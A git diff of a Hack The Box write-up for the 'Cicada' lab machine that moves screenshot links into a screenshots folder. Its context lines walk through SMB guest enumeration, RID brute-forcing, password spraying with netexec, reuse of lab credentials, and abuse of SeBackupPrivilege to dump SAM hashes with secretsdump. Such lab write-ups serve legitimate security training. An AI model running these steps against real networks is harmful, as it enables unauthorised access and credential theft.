@@ -117,7 +117,7 @@ We start by enumerating SMB shares without credentials:
 netexec smb 10.10.11.35 --shares
 ```
 
-![netexec_shares](netexec_shares.png)
+![netexec_shares](screenshots/netexec_shares.png)
 
 No relevant information is retrieved. This suggests that anonymous access is restricted for most shares.
 
@@ -145,7 +145,7 @@ Since `guest` access is sometimes enabled on internal networks, we retry with th
 netexec smb 10.10.11.35 -u 'guest' -p '' --shares
 ```
 
-![smbclient_guest_shares](smbclient_guest_shares.png)
+![smbclient_guest_shares](screenshots/smbclient_guest_shares.png)
 
 `HR` and `IPC$` shares are accessible.
 
@@ -159,7 +159,7 @@ To view detailed permissions, we use `smbmap`:
 smbmap -H 10.10.11.35 -u 'guest' -p ''
 ```
 
-![smbmap_guest_nopasswd](smbmap_guest_nopasswd.png)
+![smbmap_guest_nopasswd](screenshots/smbmap_guest_nopasswd.png)
 
 Most shares are inaccessible except for `HR` and `IPC$`.
 
@@ -173,7 +173,7 @@ We recursively list the contents of the `HR` share:
 smbmap -H 10.10.11.35 -u 'guest' -p '' -r HR
 ```
 
-![smbmap_guest_hr](smbmap_guest_hr.png)
+![smbmap_guest_hr](screenshots/smbmap_guest_hr.png)
 
 We find a file named `Notice_from_HR.txt`.
 
@@ -189,7 +189,7 @@ get "Notice from HR.txt"
 cat Notice\ from\ HR.txt
 ```
 
-![smbclient_hr_null](smbclient_hr_null.png)
+![smbclient_hr_null](screenshots/smbclient_hr_null.png)
 
 **Finding:**  
 The file contains a plaintext password:
@@ -198,7 +198,7 @@ The file contains a plaintext password:
 
 We save it into a file named `credentials.txt` for later use.
 
-![password](password.png)
+![password](screenshots/password.png)
 
 ---
 
@@ -212,7 +212,7 @@ As we still do not have a valid username, we enumerate users by brute-forcing RI
 netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute
 ```
 
-![netexec_guest_ridbrute](netexec_guest_ridbrute.png)
+![netexec_guest_ridbrute](screenshots/netexec_guest_ridbrute.png)
 
 We clean the output:
 
@@ -221,7 +221,7 @@ netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' > user
 cat users.txt
 ```
 
-![netexec_users](netexec_users.png)
+![netexec_users](screenshots/netexec_users.png)
 
 We can further clean this list and keep only the final usernames with:
 
@@ -230,7 +230,7 @@ cat users.txt | tr '\\' ' ' | awk '{print $7}' > users_clean.txt
 cat users_clean.txt
 ```
 
-![netexec_users_clean](netexec_users_clean.png)
+![netexec_users_clean](screenshots/netexec_users_clean.png)
 
 ---
 
@@ -242,7 +242,7 @@ We confirm which accounts are valid in the domain:
 kerbrute userenum --dc 10.10.11.35 -d cicada.htb users.txt
 ```
 
-![kerbrute_users_clean](kerbrute_users_clean.png)
+![kerbrute_users_clean](screenshots/kerbrute_users_clean.png)
 
 ---
 
@@ -256,7 +256,7 @@ We test the recovered password against all valid users:
 netexec smb 10.10.11.35 -u users_clean.txt -p credentials.txt
 ```
 
-![netexec_users_credentials](netexec_users_credentials.png)
+![netexec_users_credentials](screenshots/netexec_users_credentials.png)
 
 The password matches the account `michael.wrightson`.
 
@@ -272,7 +272,7 @@ We check whether `michael.wrightson` has WinRM access:
 netexec winrm 10.10.11.35 -u 'michael.wrightson' -p credentials.txt
 ```
 
-![netexec_michael](netexec_michael.png)
+![netexec_michael](screenshots/netexec_michael.png)
 
 WinRM is disabled for this account.
 
@@ -286,7 +286,7 @@ We list accessible shares for this user:
 netexec smb 10.10.11.35 -u 'michael.wrightson' -p credentials.txt --shares
 ```
 
-![netexec_michael_shares](netexec_michael_shares.png)
+![netexec_michael_shares](screenshots/netexec_michael_shares.png)
 
 Two additional shares, `NETLOGON` and `SYSVOL`, are visible but contain no useful files.
 
@@ -302,7 +302,7 @@ We switch enumeration mode to `--users` to retrieve user descriptions:
 netexec smb 10.10.11.35 -u 'michael.wrightson' -p credentials.txt --users
 ```
 
-![netexec_michael_users](netexec_michael_users.png)
+![netexec_michael_users](screenshots/netexec_michael_users.png)
 
 **Finding:**  
 The account `david.orelious` has his password stored in the description field:
@@ -319,7 +319,7 @@ We confirm the credentials:
 netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
 ```
 
-![netexec_david](netexec_david.png)
+![netexec_david](screenshots/netexec_david.png)
 
 **Result:**  
 The login is successful.
@@ -332,7 +332,7 @@ The login is successful.
 netexec winrm 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
 ```
 
-![netexec_winrm_david](netexec_winrm_david.png)
+![netexec_winrm_david](screenshots/netexec_winrm_david.png)
 
 **Result:**  
 WinRM is also disabled for this account.
@@ -345,7 +345,7 @@ WinRM is also disabled for this account.
 netexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
 ```
 
-![netexec_david_shares](netexec_david_shares.png)
+![netexec_david_shares](screenshots/netexec_david_shares.png)
 
 **Result:**  
 David has access to the `DEV` share in addition to the previously seen shares.
@@ -360,7 +360,7 @@ We recursively list the contents of the `DEV` share:
 smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r DEV
 ```
 
-![smbmap_david_DEV](smbmap_david_DEV.png)
+![smbmap_david_DEV](screenshots/smbmap_david_DEV.png)
 
 **Finding:**  
 A file named `Backup_script.ps1` is present.
@@ -377,7 +377,7 @@ get "Backup_script.ps1"
 cat Backup_script.ps1
 ```
 
-![smbclient_get_backup](smbclient_get_backup.png)
+![smbclient_get_backup](screenshots/smbclient_get_backup.png)
 
 **Finding:**  
 The script contains plaintext credentials for another account:
@@ -393,7 +393,7 @@ netexec smb 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 netexec winrm 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
 ```
 
-![netexec_emily](netexec_emily.png)
+![netexec_emily](screenshots/netexec_emily.png)
 
 Successful.
 ### 3.10 Gaining Remote Shell with Evil-WinRM
@@ -425,7 +425,7 @@ net user emily.oscars
 whoami /priv
 ```
 
-![emily_priv](emily_priv.png)
+![emily_priv](screenshots/emily_priv.png)
 
 **Finding:**  
 The account has the `SeBackupPrivilege` enabled and is a member of the **Backup Operators** group.  
@@ -465,7 +465,7 @@ We use `impacket-secretsdump` locally to dump the NTLM hashes from the extracted
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 ```
 
-![local_hives](local_hives.png)
+![local_hives](screenshots/local_hives.png)
 
 **Finding:**  
 We recover the **Administrator** NTLM hash:
